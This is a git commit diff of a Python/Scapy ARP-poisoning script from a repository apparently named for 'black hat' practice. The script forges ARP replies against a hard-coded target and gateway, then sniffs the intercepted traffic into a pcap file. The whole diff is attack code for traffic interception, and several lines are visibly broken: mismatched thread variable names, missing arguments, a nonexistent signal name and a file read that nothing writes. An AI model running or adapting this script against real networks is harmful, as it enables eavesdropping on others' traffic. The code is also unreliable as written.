ee6e9f8ab7f949aa09178c8a0ed0ddc15dd5b4c1
maciej <m.sobiech.wat@gmail.com>
2021-08-10 04:16:00 -0400

    almost done

--- black_hat_scripts/sniffing_3_arp_poisoning.py
+++ black_hat_scripts/sniffing_3_arp_poisoning.py
@@ -2,26 +2,28 @@ from scapy.all import *
 from time import sleep
 import os
 import sys
+from threading import Thread
 
 INTERFACE = 'eth0'
-TARGER_IP = '172.26.1.11'
+TARGET_IP = '172.26.1.11'
 GATEWAY_IP = '172.26.1.1'
-conut = 1000
+count = 1000
 
 conf.iface = INTERFACE
+conf.verb = 0
 
 #---------------Funckje-----------------
 def get_mac(ip):
-    ans, _ = send(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip), retry=2, count=10)
-    for send, responsed in ans:
-        return responsed[Ether].src
+    ans, uans = send(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip))
+    for s, r in ans:
+        return r[Ether].src
 
 def poison_attack(gateway_ip, gateway_mac, target_ip, target_mac):
     poison_target = ARP()
     poison_target.op = 2
     poison_target.psrc = gateway_ip
-    posion_target.pdst = target_ip
-    posion_target.hwdst = target_mac
+    poison_target.pdst = target_ip
+    poison_target.hwdst = target_mac
 
     poison_gateway = ARP()
     poison_gateway.op = 2
@@ -48,6 +50,19 @@ def restore_defaults(gateway_ip, gateway_mac, target_ip, target_mac):
 
     os.kill(os.getpid(), sys.SIGINIT)
 
-TARGET_MAC = get_mac(TARGER_IP)
+
+TARGET_MAC = get_mac(TARGET_IP)
 GATEWAY_MAC = get_mac(GATEWAY_IP)
 
+# main
+posion_thread = Thread(target=poison_attack, args=(GATEWAY_IP, GATEWAY_MAC, TARGET_IP))
+poison_thread.start()
+
+
+bpf_filter = f"ip host {TARGET_IP}"
+
+
+sniff(filter=bpf_filter, count=count)
+pcap = rdpcap("./capture.pcap")
+
+wrpcap("arp.pcap", pcap)
